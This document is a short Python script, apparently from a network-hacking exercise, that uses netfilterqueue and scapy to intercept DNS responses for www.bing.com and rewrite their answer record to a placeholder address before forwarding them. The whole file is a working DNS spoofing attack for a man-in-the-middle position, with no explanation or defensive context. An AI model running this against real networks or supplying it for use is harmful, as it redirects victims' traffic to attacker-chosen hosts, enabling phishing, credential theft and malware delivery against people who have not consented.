#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        dns_record=scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in dns_record:
            print("[+] Spoofing target")
            answer=scapy.DNSRR(rrname=dns_record, rdata="IP")
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))
    packet.accept()
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()